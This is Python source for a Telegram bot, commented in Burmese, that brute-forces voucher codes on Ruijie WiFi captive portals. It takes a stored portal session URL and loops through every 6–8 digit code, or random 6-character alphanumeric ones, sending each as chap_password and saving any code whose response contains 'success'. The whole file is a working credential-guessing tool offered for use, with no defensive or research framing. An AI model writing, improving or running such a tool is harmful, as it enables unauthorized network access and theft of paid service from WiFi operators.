import os
import asyncio
import aiohttp
import json
import random
import re
import time
import uuid
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")  # မင်းရဲ့ Token ကို Environment Variable ကနေ ယူတယ်
ADMIN_ID = int(os.getenv("ADMIN_ID", "8537971974"))  # မင်းရဲ့ Telegram User ID

# === GLOBAL STATE ===
user_data = {}
scanning_active = False
found_codes = []
scan_task = None
stop_scan = False

# === COMMAND HANDLERS ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 WiFi Voucher Scanner Bot (Termux Edition)\n\n"
        "/setup <url> - Session URL ထည့်ရန်\n"
        "/brute <6|7|8|all> - Scan စတင်ရန်\n"
        "/stop - Scan ရပ်ရန်\n"
        "/saved - တွေ့ရှိထားသော codes များကြည့်ရန်\n"
        "/status - Bot အခြေအနေကြည့်ရန်"
    )

async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args
    if not args:
        await update.message.reply_text("❌ /setup <session_url> ကို သုံးပါ")
        return
    url = args[0]
    if "ruijienetworks.com" not in url:
        await update.message.reply_text("❌ Ruijie portal URL မဟုတ်ပါ")
        return
    user_data[chat_id] = {"session_url": url}
    await update.message.reply_text("✅ Session URL သိမ်းဆည်းပြီး")

async def brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scanning_active, found_codes, scan_task, stop_scan
    chat_id = update.effective_chat.id
    if chat_id not in user_data:
        await update.message.reply_text("❌ /setup ဖြင့် URL ထည့်ပါ")
        return
    args = context.args
    if not args:
        await update.message.reply_text("❌ /brute <6|7|8|all> ကို သုံးပါ")
        return
    mode = args[0]
    if mode not in ["6", "7", "8", "all"]:
        await update.message.reply_text("❌ 6, 7, 8, all ကိုသာ သုံးပါ")
        return
    if scanning_active:
        await update.message.reply_text("⏳ Scan လုပ်နေပြီးသား")
        return
    scanning_active = True
    stop_scan = False
    found_codes = []
    session_url = user_data[chat_id]["session_url"]
    await update.message.reply_text(f"🚀 Scan စတင်ပြီ — Mode: {mode}")
    
    # Scan ကို background thread မှာ run မယ်
    scan_task = asyncio.create_task(run_bruteforce(update, context, mode, session_url))

async def run_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE, mode: str, session_url: str):
    global scanning_active, found_codes, stop_scan
    chat_id = update.effective_chat.id
    
    # Brute-force logic
    chars = "0123456789"
    if mode == "all":
        chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    
    total = 10**int(mode) if mode in ["6", "7", "8"] else 1000000
    checked = 0
    start_time = time.time()
    progress_msg = await context.bot.send_message(chat_id, "🔍 Scan စတင်နေပါသည်...")
    
    for i in range(total):
        if stop_scan or not scanning_active:
            break
        
        # Code ကို generate လုပ်ပါ
        if mode in ["6", "7", "8"]:
            code = str(i).zfill(int(mode))
        else:
            code = "".join(random.choice(chars) for _ in range(6))
        
        checked += 1
        
        # Ruijie API ကို request လုပ်ပါ (simplified)
        try:
            async with aiohttp.ClientSession() as sess:
                test_url = f"{session_url}&chap_password={code}"
                async with sess.get(test_url, timeout=5) as response:
                    if response.status == 200:
                        text = await response.text()
                        if "success" in text.lower():
                            found_codes.append(code)
                            await context.bot.send_message(
                                chat_id,
                                f"✅ Found: {code}"
                            )
        except:
            pass
        
        # Progress update (၁၀၀ ကြိမ်တိုင်း)
        if checked % 100 == 0:
            elapsed = time.time() - start_time
            speed = int((checked / elapsed) * 60) if elapsed > 0 else 0
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=(
                        f"🔍 Scanning...\n"
                        f"📦 Checked: {checked:,}\n"
                        f"⚡ Speed: {speed:,} codes/min\n"
                        f"✅ Found: {len(found_codes)}\n"
                        f"📊 Progress: {min(100, (checked/total)*100):.1f}%"
                    )
                )
            except:
                pass
        
        # Termux မှာ CPU အပူလွန်မှုကို ကာကွယ်ဖို့ နည်းနည်းနားပါ
        await asyncio.sleep(0.01)
    
    scanning_active = False
    await context.bot.send_message(
        chat_id,
        f"🏁 Scan ပြီးဆုံးပြီ — Found: {len(found_codes)} codes"
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scanning_active, stop_scan
    scanning_active = False
    stop_scan = True
    await update.message.reply_text("⏹️ Scan ရပ်တန့်ပြီး")

async def saved(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not found_codes:
        await update.message.reply_text("📭 တွေ့ရှိထားသော code မရှိပါ")
        return
    text = "✅ Found Codes:\n" + "\n".join(found_codes[-20:])
    await update.message.reply_text(text)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    uptime = time.time() - start_time
    await update.message.reply_text(
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {int(uptime//3600)}h {int((uptime%3600)//60)}m\n"
        f"🔍 Scan Active: {scanning_active}\n"
        f"✅ Found Codes: {len(found_codes)}"
    )

# === MAIN ===
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("brute", brute))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("saved", saved))
    app.add_handler(CommandHandler("status", status))
    app.run_polling()

if __name__ == "__main__":
    start_time = time.time()
    main()
